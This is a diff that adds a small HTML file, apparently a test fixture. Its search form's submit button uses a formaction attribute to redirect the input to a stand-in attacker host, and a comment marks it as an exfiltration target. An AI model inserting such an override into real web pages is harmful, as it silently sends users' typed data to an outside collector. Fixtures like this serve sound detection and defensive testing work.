@@ -1,0 +1,10 @@
+<!doctype html>
+<html>
+  <body>
+    <form action="/local">
+      <input type="text" name="q">
+      <!-- formaction overrides the form's action to an external exfiltration target -->
+      <button type="submit" formaction="https://attacker.example/collect">Search</button>
+    </form>
+  </body>
+</html>
